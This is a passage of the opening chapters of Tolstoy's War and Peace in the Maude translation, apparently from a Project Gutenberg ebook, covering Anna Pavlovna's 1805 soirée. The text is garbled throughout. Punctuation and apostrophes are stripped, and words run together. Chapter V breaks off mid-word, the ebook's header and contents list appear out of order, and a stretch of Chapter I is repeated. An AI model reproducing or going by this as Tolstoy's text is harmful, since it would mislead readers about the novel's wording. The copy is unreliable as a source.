But how do you do? I see I have frightenedyou--sit down and tell me all the newsIt was in July, 1805, and the speaker was the well-known Anna PavlovnaScherer, maid of honor and favorite of the Empress Marya Fedorovna Withthese words she greeted Prince Vasili Kuragin, a man of high rank andimportance, who was the first to arrive at her reception Anna Pavlovnahad had a cough for some days She was, as she said, suffering from lagrippe grippe being then a new word in St Petersburg, used only by theeliteAll her invitations without exception, written in French, and deliveredby a scarlet-liveried footman that morning, ran as followsIf you have nothing better to do, Count (or Prince), and if theprospect of spending an evening with a poor invalid is not too terrible,I shall be very charmed to see you tonight between 7 and 10--AnnetteSchererHeavens! what a virulent attack! replied the prince, not in the leastdisconcerted by this reception He had just entered, wearing anembroidered court uniform, knee breeches, and shoes, and had stars onhis breast and a serene expression on his flat face He spoke in thatrefined French in which our grandfathers not only spoke but thought, andwith the gentle, patronizing intonation natural to a man of importancewho had grown old in society and at court He went up to Anna Pavlovna,kissed her hand, presenting to her his bald, scented, and shining head,and complacently seated himself on the sofaFirst of all, dear friend, tell me how you are Set your friends mindat rest, said he without altering his tone, beneath the politeness andaffected sympathy of which indifference and even irony could bediscernedCan one be well while suffering morally? Can one be calm in times likethese if one has any feeling? said Anna Pavlovna You are staying thewhole evening, I hope?And the fete at the English ambassadors? Today is Wednesday I mustput in an appearance there, said the prince My daughter is coming forme to take me thereI thought todays fete had been canceled I confess all thesefestivities and fireworks are becoming wearisomeIf they had known that you wished it, the entertainment would have beenput off, said the prince, who, like a wound-up clock, by force of habitsaid things he did not even wish to be believedDont tease! Well, and what has been decided about Novosiltsevsdispatch? You know everythingWhat can one say about it? replied the prince in a cold, listlesstone What has been decided? They have decided that Buonaparte hasburnt his boats, and I believe that we are ready to burn oursPrince Vasili always spoke languidly, like an actor repeating a stalepart Anna Pavlovna Scherer on the contrary, despite her forty years,overflowed with animation and impulsiveness To be an enthusiast hadbecome her social vocation and, sometimes even when she did not feellike it, she became enthusiastic in order not to disappoint theexpectations of those who knew her The subdued smile which, though itdid not suit her faded features, always played round her lips expressed,as in a spoiled child, a continual consciousness of her charming defect,which she neither wished, nor could, nor considered it necessary, tocorrectIn the midst of a conversation on political matters Anna Pavlovna burstoutOh, dont speak to me of Austria Perhaps I dont understand things,but Austria never has wished, and does not wish, for war She isbetraying us! Russia alone must save Europe Our gracious sovereignrecognizes his high vocation and will be true to it That is the onething I have faith in! Our good and wonderful sovereign has to performthe noblest role on earth, and he is so virtuous and noble that God willnot forsake him He will fulfill his vocation and crush the hydra ofrevolution, which has become more terrible than ever in the person ofthis murderer and villain! We alone must avenge the blood of the justone Whom, I ask you, can we rely on? England with her commercialspirit will not and cannot understand the Emperor Alexanders loftinessof soul She has refused to evacuate Malta She wanted to find, andstill seeks, some secret motive in our actions What answer didNovosiltsev get? None The English have not understood and cannotunderstand the self-abnegation of our Emperor who wants nothing forhimself, but only desires the good of mankind And what have theypromised? Nothing! And what little they have promised they will notperform! Prussia has always declared that Buonaparte is invincible, andthat all Europe is powerless before him And I dont believe a wordthat Hardenburg says, or Haugwitz either This famous Prussianneutrality is just a trap I have faith only in God and the loftydestiny of our adored monarch He will save Europe!She suddenly paused, smiling at her own impetuosityI think, said the prince with a smile, that if you had been sentinstead of our dear Wintzingerode you would have captured the King ofPrussias consent by assault You are so eloquent Will you give me acup of tea?In a moment A propos, she added, becoming calm again, I am expectingtwo very interesting men tonight, le Vicomte de Mortemart, who isconnected with the Montmorencys through the Rohans, one of the bestFrench families He is one of the genuine emigres, the good ones Andalso the Abbe Morio Do you know that profound thinker? He has beenreceived by the Emperor Had you heard?I shall be delighted to meet them, said the prince But tell me, headded with studied carelessness as if it had only just occurred to him,though the question he was about to ask was the chief motive of hisvisit, is it true that the Dowager Empress wants Baron Funke to beappointed first secretary at Vienna? The baron by all accounts is a poorcreaturePrince Vasili wished to obtain this post for his son, but others weretrying through the Dowager Empress Marya Fedorovna to secure it for thebaronAnna Pavlovna almost closed her eyes to indicate that neither she noranyone else had a right to criticize what the Empress desired or waspleased withBaron Funke has been recommended to the Dowager Empress by her sister,was all she said, in a dry and mournful toneAs she named the Empress, Anna Pavlovnas face suddenly assumed anexpression of profound and sincere devotion and respect mingled withsadness, and this occurred every time she mentioned her illustriouspatroness She added that Her Majesty had deigned to show Baron Funkebeaucoup destime, and again her face clouded over with sadnessThe prince was silent and looked indifferent But, with the womanly andcourtierlike quickness and tact habitual to her, Anna Pavlovna wishedboth to rebuke him (for daring to speak as he had done of a manrecommended to the Empress) and at the same time to console him, so shesaidNow about your family Do you know that since your daughter came outeveryone has been enraptured by her? They say she is amazinglybeautifulThe prince bowed to signify his respect and gratitudeI often think, she continued after a short pause, drawing nearer tothe prince and smiling amiably at him as if to show that political andsocial topics were ended and the time had come for intimateconversation--I often think how unfairly sometimes the joys of life aredistributed Why has fate given you two such splendid children? I dontspeak of Anatole, your youngest I dont like him, she added in a toneadmitting of no rejoinder and raising her eyebrows Two such charmingchildren And really you appreciate them less than anyone, and so youdont deserve to have themAnd she smiled her ecstatic smileI cant help it, said the prince Lavater would have said I lack thebump of paternityDont joke I mean to have a serious talk with you Do you know I amdissatisfied with your younger son? Between ourselves (and her faceassumed its melancholy expression), he was mentioned at Her Majestysand you were pitiedThe prince answered nothing, but she looked at him significantly,awaiting a reply He frownedWhat would you have me do? he said at last You know I did all afather could for their education, and they have both turned out foolsHippolyte is at least a quiet fool, but Anatole is an active one Thatis the only difference between them He said this smiling in a way morenatural and animated than usual, so that the wrinkles round his mouthvery clearly revealed something unexpectedly coarse and unpleasantAnd why are children born to such men as you? If you were not a fatherthere would be nothing I could reproach you with, said Anna Pavlovna,looking up pensivelyI am your faithful slave and to you alone I can confess that mychildren are the bane of my life It is the cross I have to bear Thatis how I explain it to myself It cant be helped!He said no more, but expressed his resignation to cruel fate by agesture Anna Pavlovna meditatedHave you never thought of marrying your prodigal son Anatole? sheasked They say old maids have a mania for matchmaking, and though Idont feel that weakness in myself as yet, I know a little person who isvery unhappy with her father She is a relation of yours, Princess MaryBolkonskayaPrince Vasili did not reply, though, with the quickness of memory andperception befitting a man of the world, he indicated by a movement ofthe head that he was considering this informationDo you know, he said at last, evidently unable to check the sadcurrent of his thoughts, that Anatole is costing me forty thousandrubles a year? And, he went on after a pause, what will it be in fiveyears, if he goes on like this? Presently he added Thats what wefathers have to put up with Is this princess of yours rich?Her father is very rich and stingy He lives in the country He is thewell-known Prince Bolkonski who had to retire from the army under thelate Emperor, and was nicknamed the King of Prussia He is very cleverbut eccentric, and a bore The poor girl is very unhappy She has abrother I think you know him, he married Lise Meinen lately He is anaide-de-camp of Kutuzovs and will be here tonightListen, dear Annette, said the prince, suddenly taking Anna Pavlovnashand and for some reason drawing it downwards Arrange that affair forme and I shall always be your most devoted slave-slafe with an f, as avillage elder of mine writes in his reports She is rich and of goodfamily and thats all I wantAnd with the familiarity and easy grace peculiar to him, he raised themaid of honors hand to his lips, kissed it, and swung it to and fro ashe lay back in his armchair, looking in another directionAttendez, said Anna Pavlovna, reflecting, Ill speak to Lise, youngBolkonskis wife, this very evening, and perhaps the thing can bearranged It shall be on your familys behalf that Ill start myapprenticeship as old maidCHAPTER IIAnna Pavlovnas drawing room was gradually filling The highestPetersburg society was assembled there people differing widely in ageand character but alike in the social circle to which they belongedPrince Vasilis daughter, the beautiful Helene, came to take her fatherto the ambassadors entertainment she wore a ball dress and her badgeas maid of honor The youthful little Princess Bolkonskaya, known as lafemme la plus seduisante de Petersbourg,  was also there She had beenmarried during the previous winter, and being pregnant did not go to anylarge gatherings, but only to small receptions Prince Vasilis son,Hippolyte, had come with Mortemart, whom he introduced The Abbe Morioand many others had also come The most fascinating woman in PetersburgTo each new arrival Anna Pavlovna said, You have not yet seen my aunt,or You do not know my aunt? and very gravely conducted him or her to alittle old lady, wearing large bows of ribbon in her cap, who had comesailing in from another room as soon as the guests began to arrive andslowly turning her eyes from the visitor to her aunt, Anna Pavlovnamentioned each ones name and then left themEach visitor performed the ceremony of greeting this old aunt whom notone of them knew, not one of them wanted to know, and not one of themcared about Anna Pavlovna observed these greetings with mournful andsolemn interest and silent approval The aunt spoke to each of them inthe same words, about their health and her own, and the health of HerMajesty, who, thank God, was better today And each visitor, thoughpoliteness prevented his showing impatience, left the old woman with asense of relief at having performed a vexatious duty and did not returnto her the whole eveningThe young Princess Bolkonskaya had brought some work in a gold-embroidered velvet bag Her pretty little upper lip, on which a delicatedark down was just perceptible, was too short for her teeth, but itlifted all the more sweetly, and was especially charming when sheoccasionally drew it down to meet the lower lip As is always the casewith a thoroughly attractive woman, her defect--the shortness of herupper lip and her half-open mouth--seemed to be her own special andpeculiar form of beauty Everyone brightened at the sight of this prettyyoung woman, so soon to become a mother, so full of life and health, andcarrying her burden so lightly Old men and dull dispirited young oneswho looked at her, after being in her company and talking to her alittle while, felt as if they too were becoming, like her, full of lifeand health All who talked to her, and at each word saw her bright smileand the constant gleam of her white teeth, thought that they were in aspecially amiable mood that dayThe little princess went round the table with quick, short, swayingsteps, her workbag on her arm, and gaily spreading out her dress satdown on a sofa near the silver samovar, as if all she was doing was apleasure to herself and to all around her I have brought my work,said she in French, displaying her bag and addressing all presentMind, Annette, I hope you have not played a wicked trick on me, sheadded, turning to her hostess You wrote that it was to be quite asmall reception, and just see how badly I am dressed And she spreadout her arms to show her short-waisted, lace-trimmed, dainty gray dress,girdled with a broad ribbon just below the breastSoyez tranquille, Lise, you will always be prettier than anyone else,replied Anna PavlovnaYou know, said the princess in the same tone of voice and still inFrench, turning to a general, my husband is deserting me? He is goingto get himself killed Tell me what this wretched war is for? sheadded, addressing Prince Vasili, and without waiting for an answer sheturned to speak to his daughter, the beautiful HeleneWhat a delightful woman this little princess is! said Prince Vasili toAnna PavlovnaOne of the next arrivals was a stout, heavily built young man withclose-cropped hair, spectacles, the light-colored breeches fashionableat that time, a very high ruffle, and a brown dress coat This stoutyoung man was an illegitimate son of Count Bezukhov, a well-knowngrandee of Catherines time who now lay dying in Moscow The young manhad not yet entered either the military or civil service, as he had onlyjust returned from abroad where he had been educated, and this was hisfirst appearance in society Anna Pavlovna greeted him with the nod sheaccorded to the lowest hierarchy in her drawing room But in spite ofthis lowest-grade greeting, a look of anxiety and fear, as at the sightof something too large and unsuited to the place, came over her facewhen she saw Pierre enter Though he was certainly rather bigger thanthe other men in the room, her anxiety could only have reference to theclever though shy, but observant and natural, expression whichdistinguished him from everyone else in that drawing roomIt is very good of you, Monsieur Pierre, to come and visit a poorinvalid, said Anna Pavlovna, exchanging an alarmed glance with her auntas she conducted him to herPierre murmured something unintelligible, and continued to look round asif in search of something On his way to the aunt he bowed to the littleprincess with a pleased smile, as to an intimate acquaintanceAnna Pavlovnas alarm was justified, for Pierre turned away from theaunt without waiting to hear her speech about Her Majestys health AnnaPavlovna in dismay detained him with the words Do you know the AbbeMorio? He is a most interesting manYes, I have heard of his scheme for perpetual peace, and it is veryinteresting but hardly feasibleYou think so? rejoined Anna Pavlovna in order to say something and getaway to attend to her duties as hostess But Pierre now committed areverse act of impoliteness First he had left a lady before she hadfinished speaking to him, and now he continued to speak to another whowished to get away With his head bent, and his big feet spread apart,he began explaining his reasons for thinking the abbes plan chimericalWe will talk of it later, said Anna Pavlovna with a smileAnd having got rid of this young man who did not know how to behave, sheresumed her duties as hostess and continued to listen and watch, readyto help at any point where the conversation might happen to flag As theforeman of a spinning mill, when he has set the hands to work, goesround and notices here a spindle that has stopped or there one thatcreaks or makes more noise than it should, and hastens to check themachine or set it in proper motion, so Anna Pavlovna moved about herdrawing room, approaching now a silent, now a too-noisy group, and by aword or slight rearrangement kept the conversational machine in steady,proper, and regular motion But amid these cares her anxiety aboutPierre was evident She kept an anxious watch on him when he approachedthe group round Mortemart to listen to what was being said there, andagain when he passed to another group whose center was the abbePierre had been educated abroad, and this reception at Anna Pavlovnaswas the first he had attended in Russia He knew that all theintellectual lights of Petersburg were gathered there and, like a childin a toyshop, did not know which way to look, afraid of missing anyclever conversation that was to be heard Seeing the self-confident andrefined expression on the faces of those present he was always expectingto hear something very profound At last he came up to Morio Here theconversation seemed interesting and he stood waiting for an opportunityto express his own views, as young people are fond of doingCHAPTER IIIAnna Pavlovnas reception was in full swing The spindles hummedsteadily and ceaselessly on all sides With the exception of the aunt,beside whom sat only one elderly lady, who with her thin careworn facewas rather out of place in this brilliant society, the whole company hadsettled into three groups One, chiefly masculine, had formed round theabbe Another, of young people, was grouped round the beautiful PrincessHelene, Prince Vasilis daughter, and the little Princess Bolkonskaya,very pretty and rosy, though rather too plump for her age The thirdgroup was gathered round Mortemart and Anna PavlovnaThe vicomte was a nice-looking young man with soft features and polishedmanners, who evidently considered himself a celebrity but out ofpoliteness modestly placed himself at the disposal of the circle inwhich he found himself Anna Pavlovna was obviously serving him up as atreat to her guests As a clever maitre dhotel serves up as a speciallychoice delicacy a piece of meat that no one who had seen it in thekitchen would have cared to eat, so Anna Pavlovna served up to herguests, first the vicomte and then the abbe, as peculiarly choicemorsels The group about Mortemart immediately began discussing themurder of the Duc dEnghien The vicomte said that the Duc dEnghien hadperished by his own magnanimity, and that there were particular reasonsfor Buonapartes hatred of himAh, yes! Do tell us all about it, Vicomte, said Anna Pavlovna, with apleasant feeling that there was something a la Louis XV in the sound ofthat sentence Contez nous cela, VicomteThe vicomte bowed and smiled courteously in token of his willingness tocomply Anna Pavlovna arranged a group round him, inviting everyone tolisten to his taleThe vicomte knew the duc personally, whispered Anna Pavlovna to one ofthe guests The vicomte is a wonderful raconteur, said she to anotherHow evidently he belongs to the best society, said she to a third andthe vicomte was served up to the company in the choicest and mostadvantageous style, like a well-garnished joint of roast beef on a hotdishThe vicomte wished to begin his story and gave a subtle smileCome over here, Helene, dear, said Anna Pavlovna to the beautifulyoung princess who was sitting some way off, the center of anothergroupThe princess smiled She rose with the same unchanging smile with whichshe had first entered the room--the smile of a perfectly beautifulwoman With a slight rustle of her white dress trimmed with moss andivy, with a gleam of white shoulders, glossy hair, and sparklingdiamonds, she passed between the men who made way for her, not lookingat any of them but smiling on all, as if graciously allowing each theprivilege of admiring her beautiful figure and shapely shoulders, back,and bosom--which in the fashion of those days were very much exposed--and she seemed to bring the glamour of a ballroom with her as she movedtoward Anna Pavlovna Helene was so lovely that not only did she notshow any trace of coquetry, but on the contrary she even appeared shy ofher unquestionable and all too victorious beauty She seemed to wish,but to be unable, to diminish its effectHow lovely! said everyone who saw her and the vicomte lifted hisshoulders and dropped his eyes as if startled by something extraordinarywhen she took her seat opposite and beamed upon him also with herunchanging smileMadame, I doubt my ability before such an audience, said he, smilinglyinclining his headThe princess rested her bare round arm on a little table and considereda reply unnecessary She smilingly waited All the time the story wasbeing told she sat upright, glancing now at her beautiful round arm,altered in shape by its pressure on the table, now at her still morebeautiful bosom, on which she readjusted a diamond necklace From timeto time she smoothed the folds of her dress, and whenever the storyproduced an effect she glanced at Anna Pavlovna, at once adopted justthe expression she saw on the maid of honors face, and again relapsedinto her radiant smileThe little princess had also left the tea table and followed HeleneWait a moment, Ill get my work Now then, what are you thinkingof? she went on, turning to Prince Hippolyte Fetch me my workbagThere was a general movement as the princess, smiling and talkingmerrily to everyone at once, sat down and gaily arranged herself in herseatNow I am all right, she said, and asking the vicomte to begin, shetook up her workPrince Hippolyte, having brought the workbag, joined the circle andmoving a chair close to hers seated himself beside herLe charmant Hippolyte was surprising by his extraordinary resemblance tohis beautiful sister, but yet more by the fact that in spite of thisresemblance he was exceedingly ugly His features were like hissisters, but while in her case everything was lit up by a joyous, self-satisfied, youthful, and constant smile of animation, and by thewonderful classic beauty of her figure, his face on the contrary wasdulled by imbecility and a constant expression of sullen self-confidence, while his body was thin and weak His eyes, nose, and mouthall seemed puckered into a vacant, wearied grimace, and his arms andlegs always fell into unnatural positionsIts not going to be a ghost story? said he, sitting down beside theprincess and hastily adjusting his lorgnette, as if without thisinstrument he could not begin to speakWhy no, my dear fellow, said the astonished narrator, shrugging hisshouldersBecause I hate ghost stories, said Prince Hippolyte in a tone whichshowed that he only understood the meaning of his words after he haduttered themHe spoke with such self-confidence that his hearers could not be surewhether what he said was very witty or very stupid He was dressed in adark-green dress coat, knee breeches of the color of cuisse de nympheeffrayee, as he called it, shoes, and silk stockingsThe vicomte told his tale very neatly It was an anecdote, then current,to the effect that the Duc dEnghien had gone secretly to Paris to visitMademoiselle George that at her house he came upon Bonaparte, who alsoenjoyed the famous actress favors, and that in his presence Napoleonhappened to fall into one of the fainting fits to which he was subject,and was thus at the ducs mercy The latter spared him, and thismagnanimity Bonaparte subsequently repaid by deathThe story was very pretty and interesting, especially at the point wherethe rivals suddenly recognized one another and the ladies lookedagitatedCharming! said Anna Pavlovna with an inquiring glance at the littleprincessCharming! whispered the little princess, sticking the needle into herwork as if to testify that the interest and fascination of the storyprevented her from going on with itThe vicomte appreciated this silent praise and smiling gratefullyprepared to continue, but just then Anna Pavlovna, who had kept awatchful eye on the young man who so alarmed her, noticed that he wastalking too loudly and vehemently with the abbe, so she hurried to therescue Pierre had managed to start a conversation with the abbe aboutthe balance of power, and the latter, evidently interested by the youngmans simple-minded eagerness, was explaining his pet theory Both weretalking and listening too eagerly and too naturally, which was why AnnaPavlovna disapprovedThe means are the balance of power in Europe and the rights of thepeople, the abbe was saying It is only necessary for one powerfulnation like Russia--barbaric as she is said to be--to place herselfdisinterestedly at the head of an alliance having for its object themaintenance of the balance of power of Europe, and it would save theworld!But how are you to get that balance? Pierre was beginningAt that moment Anna Pavlovna came up and, looking severely at Pierre,asked the Italian how he stood Russian climate The Italians faceinstantly changed and assumed an offensively affected, sugaryexpression, evidently habitual to him when conversing with womenI am so enchanted by the brilliancy of the wit and culture of thesociety, more especially of the feminine society, in which I have hadthe honor of being received, that I have not yet had time to think ofthe climate, said heNot letting the abbe and Pierre escape, Anna Pavlovna, the moreconveniently to keep them under observation, brought them into thelarger circleCHAPTER IVJust then another visitor entered the drawing room Prince AndrewBolkonski, the little princess husband He was a very handsome youngman, of medium height, with firm, clearcut features Everything abouthim, from his weary, bored expression to his quiet, measured step,offered a most striking contrast to his quiet, little wife It wasevident that he not only knew everyone in the drawing room, but hadfound them to be so tiresome that it wearied him to look at or listen tothem And among all these faces that he found so tedious, none seemed tobore him so much as that of his pretty wife He turned away from herwith a grimace that distorted his handsome face, kissed Anna Pavlovnashand, and screwing up his eyes scanned the whole companyYou are off to the war, Prince? said Anna PavlovnaGeneral Kutuzov, said Bolkonski, speaking French and stressing thelast syllable of the generals name like a Frenchman, has been pleasedto take me as an aide-de-campAnd Lise, your wife?She will go to the countryAre you not ashamed to deprive us of your charming wife?Andre, said his wife, addressing her husband in the same coquettishmanner in which she spoke to other men, the vicomte has been telling ussuch a tale about Mademoiselle George and Buonaparte!Prince Andrew screwed up his eyes and turned away Pierre, who from themoment Prince Andrew entered the room had watched him with glad,affectionate eyes, now came up and took his arm Before he looked roundPrince Andrew frowned again, expressing his annoyance with whoever wastouching his arm, but when he saw Pierres beaming face he gave him anunexpectedly kind and pleasant smileThere now! So you, too, are in the great world? said he to PierreI knew you would be here, replied Pierre I will come to supper withyou May I? he added in a low voice so as not to disturb the vicomtewho was continuing his storyNo, impossible! said Prince Andrew, laughing and pressing Pierreshand to show that there was no need to ask the question He wished tosay something more, but at that moment Prince Vasili and his daughtergot up to go and the two young men rose to let them passYou must excuse me, dear Vicomte, said Prince Vasili to the Frenchman,holding him down by the sleeve in a friendly way to prevent his risingThis unfortunate fete at the ambassadors deprives me of a pleasure,and obliges me to interrupt you I am very sorry to leave yourenchanting party, said he, turning to Anna PavlovnaHis daughter, Princess Helene, passed between the chairs, lightlyholding up the folds of her dress, and the smile shone still moreradiantly on her beautiful face Pierre gazed at her with rapturous,almost frightened, eyes as she passed himVery lovely, said Prince AndrewVery, said PierreIn passing Prince Vasili seized Pierres hand and said to Anna PavlovnaEducate this bear for me! He has been staying with me a whole month andthis is the first time I have seen him in society Nothing is sonecessary for a young man as the society of clever womenAnna Pavlovna smiled and promised to take Pierre in hand She knew hisfather to be a connection of Prince Vasilis The elderly lady who hadbeen sitting with the old aunt rose hurriedly and overtook Prince Vasiliin the anteroom All the affectation of interest she had assumed hadleft her kindly and tear-worn face and it now expressed only anxiety andfearHow about my son Boris, Prince? said she, hurrying after him into theanteroom I cant remain any longer in Petersburg Tell me what news Imay take back to my poor boyAlthough Prince Vasili listened reluctantly and not very politely to theelderly lady, even betraying some impatience, she gave him aningratiating and appealing smile, and took his hand that he might not goawayWhat would it cost you to say a word to the Emperor, and then he wouldbe transferred to the Guards at once? said sheBelieve me, Princess, I am ready to do all I can, answered PrinceVasili, but it is difficult for me to ask the Emperor I should adviseyou to appeal to Rumyantsev through Prince Golitsyn That would be thebest wayThe elderly lady was a Princess Drubetskaya, belonging to one of thebest families in Russia, but she was poor, and having long been out ofsociety had lost her former influential connections She had now come toPetersburg to procure an appointment in the Guards for her only son Itwas, in fact, solely to meet Prince Vasili that she had obtained aninvitation to Anna Pavlovnas reception and had sat listening to thevicomtes story Prince Vasilis words frightened her, an embitteredlook clouded her once handsome face, but only for a moment then shesmiled again and clutched Prince Vasilis arm more tightlyListen to me, Prince, said she I have never yet asked you foranything and I never will again, nor have I ever reminded you of myfathers friendship for you but now I entreat you for Gods sake to dothis for my son--and I shall always regard you as a benefactor, sheadded hurriedly No, dont be angry, but promise! I have asked Golitsynand he has refused Be the kindhearted man you always were, she said,trying to smile though tears were in her eyesPapa, we shall be late, said Princess Helene, turning her beautifulhead and looking over her classically molded shoulder as she stoodwaiting by the doorInfluence in society, however, is a capital which has to be economizedif it is to last Prince Vasili knew this, and having once realized thatif he asked on behalf of all who begged of him, he would soon be unableto ask for himself, he became chary of using his influence But inPrincess Drubetskayas case he felt, after her second appeal, somethinglike qualms of conscience She had reminded him of what was quite truehe had been indebted to her father for the first steps in his careerMoreover, he could see by her manners that she was one of those women--mostly mothers--who, having once made up their minds, will not restuntil they have gained their end, and are prepared if necessary to go oninsisting day after day and hour after hour, and even to make scenesThis last consideration moved himMy dear Anna Mikhaylovna, said he with his usual familiarity andweariness of tone, it is almost impossible for me to do what you askbut to prove my devotion to you and how I respect your fathers memory,I will do the impossible--your son shall be transferred to the GuardsHere is my hand on it Are you satisfied?My dear benefactor! This is what I expected from you--I knew yourkindness! He turned to goWait--just a word! When he has been transferred to the Guards shefaltered You are on good terms with Michael Ilarionovich Kutuzovrecommend Boris to him as adjutant! Then I shall be at rest, andthenPrince Vasili smiledNo, I wont promise that You dont know how Kutuzov is pestered sincehis appointment as Commander in Chief He told me himself that all theMoscow ladies have conspired to give him all their sons as adjutantsNo, but do promise! I wont let you go! My dear benefactorPapa, said his beautiful daughter in the same tone as before, weshall be lateWell, au revoir! Good-bye! You hear her?Then tomorrow you will speak to the Emperor?Certainly but about Kutuzov, I dont promiseDo promise, do promise, Vasili! cried Anna Mikhaylovna as he went,with the smile of a coquettish girl, which at one time probably camenaturally to her, but was now very ill-suited to her careworn faceApparently she had forgotten her age and by force of habit employed allthe old feminine arts But as soon as the prince had gone her faceresumed its former cold, artificial expression She returned to thegroup where the vicomte was still talking, and again pretended tolisten, while waiting till it would be time to leave Her task wasaccomplishedCHAPTER VAnd what do you think of this latest comedy, the coronation at Milan?asked Anna Pavlovna, and of the comedy of the people of Genoa and Luccalaying their petitions before Monsieur Buonaparte, and MonsieurBuonaparte sitting on a throne and granting the petitions of thenations? Adorable! It is enough to make ones head whirl! It is as ifthe whole world had gone crazyPrince Andrew looked Anna Pavlovna straight in the face with a sarcasticsmileDieu me la donne, gare a qui la touche!  They say he was very finewhen he said that, he remarked, repeating the words in Italian Diomi lha dato Guai a chi la tocchi! God has given it to me, let him who touches it beware!I hope this will prove the last drop that will make the glass runover, Anna Pavlovna continued The sovereigns will not be able toendure this man who is a menace to everythingThe sovereigns? I do not speak of Russia, said the vicomte, polite buthopeless The sovereigns, madame What have they done for Louis XVII,for the Queen, or for Madame Elizabeth? Nothing! and he became moreanimated And believe me, they are reaping the reward of their betrayalof the Bourbon cause The sovereigns! Why, they are sending ambassadorsto compliment the usurperAnd sighing disdainfully, he again changed his positionPrince Hippolyte, who had been gazing at the vicomte for some timethrough his lorgnette, suddenly turned completely round toward thelittle princess, and having asked for a needle began tracing the Condecoat of arms on the table He explained this to her with as much gravityas if she had asked him to do itBaton de gueules, engrele de gueules dazur--maison Conde, said heThe princess listened, smilingIf Buonaparte remains on the throne of France a year longer, thevicomte continued, with the air of a man who, in a matter with which heis better acquainted than anyone else, does not listen to others butfollows the current of his own thoughts, things will have gone too farBy intrigues, violence, exile, and executions, French society--I meangood French society--will have been forever destroyed, and thenHe shrugged his shoulders and sprThe Project Gutenberg EBook of War and Peace, by Leo TolstoyThis eBook is for the use of anyone anywhere at no cost and with almostno restrictions whatsoever  You may copy it, give it away or re-use itunder the terms of the Project Gutenberg License included with thiseBook or online at wwwgutenbergorgTitle War and PeaceAuthor Leo TolstoyTranslators Louise and Aylmer MaudePosting Date January 10, 2009 [EBook #2600]Last Updated March 15, 2013Language English START OF THIS PROJECT GUTENBERG EBOOK WAR AND PEACE An Anonymous Volunteer, and David WidgerWAR AND PEACEBy Leo Tolstoy/TolstoiCONTENTSBOOK ONE 1805CHAPTER ICHAPTER IICHAPTER IIICHAPTER IVCHAPTER VCHAPTER VICHAPTER VIICHAPTER VIIICHAPTER IXCHAPTER XCHAPTER XICHAPTER XIICHAPTER XIIICHAPTER XIVCHAPTER XVCHAPTER XVICHAPTER XVIICHAPTER XVIIICHAPTER XIXCHAPTER XXCHAPTER XXICHAPTER XXIICHAPTER XXIIICHAPTER XXIVCHAPTER XXVCHAPTER XXVICHAPTER XXVIICHAPTER XXVIIIBOOK TWO 1805CHAPTER ICHAPTER IICHAPTER IIICHAPTER IVCHAPTER VCHAPTER VICHAPTER VIICHAPTER VIIICHAPTER IXCHAPTER XCHAPTER XICHAPTER XIICHAPTER XIIICHAPTER XIVCHAPTER XVCHAPTER XVICHAPTER XVIICHAPTER XVIIICHAPTER XIXCHAPTER XXCHAPTER XXIBOOK THREE 1805CHAPTER ICHAPTER IICHAPTER IIICHAPTER IVCHAPTER VCHAPTER VICHAPTER VIICHAPTER VIIICHAPTER IXCHAPTER XCHAPTER XICHAPTER XIICHAPTER XIIICHAPTER XIVCHAPTER XVCHAPTER XVICHAPTER XVIICHAPTER XVIIICHAPTER XIXBOOK FOUR 1806CHAPTER ICHAPTER IICHAPTER IIICHAPTER IVCHAPTER VCHAPTER VICHAPTER VIICHAPTER VIIICHAPTER IXCHAPTER XCHAPTER XICHAPTER XIICHAPTER XIIICHAPTER XIVCHAPTER XVCHAPTER XVIBOOK FIVE 1806 -

Can one be calm in times likethese if one has any feeling? said Anna Pavlovna You are staying thewhole evening, I hope?And the fete at the English ambassadors? Today is Wednesday I mustput in an appearance there, said the prince My daughter is coming forme to take me thereI thought todays fete had been canceled I confess all thesefestivities and fireworks are becoming wearisomeIf they had known that you wished it, the entertainment would have beenput off, said the prince, who, like a wound-up clock, by force of habitsaid things he did not even wish to be believedDont tease! Well, and what has been decided about Novosiltsevsdispatch? You know everythingWhat can one say about it? replied the prince in a cold, listlesstone What has been decided? They have decided that Buonaparte hasburnt his boats, and I believe that we are ready to burn oursPrince Vasili always spoke languidly, like an actor repeating a stalepart Anna Pavlovna Scherer on the contrary, despite her forty years,overflowed with animation and impulsiveness To be an enthusiast hadbecome her social vocation and, sometimes even when she did not feellike it, she became enthusiastic in order not to disappoint theexpectations of those who knew her The subdued smile which, though itdid not suit her faded features, always played round her lips expressed,as in a spoiled child, a continual consciousness of her charming defect,which she neither wished, nor could, nor considered it necessary, tocorrectIn the midst of a conversation on political matters Anna Pavlovna burstoutOh, dont speak to me of Austria Perhaps I dont understand things,but Austria never has wished, and does not wish, for war She isbetraying us! Russia alone must save Europe Our gracious sovereignrecognizes his high vocation and will be true to it That is the onething I have faith in! Our good and wonderful sovereign has to performthe noblest role on earth, and he is so virtuous and noble that God willnot forsake him He will fulfill his vocation and crush the hydra ofrevolution, which has become more terrible than ever in the person ofthis murderer and villain! We alone must avenge the blood of the justone Whom, I ask you, can we rely on? England with her commercialspirit will not and cannot understand the Emperor Alexanders loftinessof soul She has refused to evacuate Malta She wanted to find, andstill seeks, some secret motive in our actions What answer didNovosiltsev get? None The English have not understood and cannotunderstand the self-abnegation of our Emperor who wants nothing forhimself, but only desires the good of mankind And what have theypromised? Nothing! And what little they have promised they will notperform! Prussia has always declared that Buonaparte is invincible, andthat all Europe is powerless before him And I dont believe a wordthat Hardenburg says, or Haugwitz either This famous Prussianneutrality is just a trap I have faith only in God and the loftydestiny of our adored monarch He will save Europe!She suddenly paused, smiling at her own impetuosityI think, said the prince with a smile, that if you had been sentinstead of our dear Wintzingerode you would have captured the King ofPrussias consent by assault You are so eloquent Will you give me acup of tea?In a moment A propos, she added, becoming calm again, I am expectingtwo very interesting men tonight, le Vicomte de Mortemart, who isconnected with the Montmorencys through the Rohans, one of the bestFrench families He is one of the genuine emigres, the good ones Andalso the Abbe Morio Do you know that profound thinker? He has beenreceived by the Emperor Had you heard?I shall be delighted to meet them, said the prince But tell me, headded with studied carelessness as if it had only just occurred to him,though the question he was about to ask was the chief motive of hisvisit, is it true that the Dowager Empress wants Baron Funke to beappointed first secretary at Vienna? The baron by all accounts is a poorcreaturePrince Vasili wished to obtain this post for his son, but others weretrying through the Dowager Empress Marya Fedorovna to secure it for thebaronAnna Pavlovna almost closed her eyes to indicate that neither she noranyone else had a right to criticize what the Empress desired or waspleased withBaron Funke has been recommended to the Dowager Empress by her sister,was all she said, in a dry and mournful toneAs she named the Empress, Anna Pavlovnas face suddenly assumed anexpression of profound and sincere devotion and respect mingled withsadness, and this occurred every time she mentioned her illustriouspatroness She added that Her Majesty had deigned to show Baron Funkebeaucoup destime, and again her face clouded 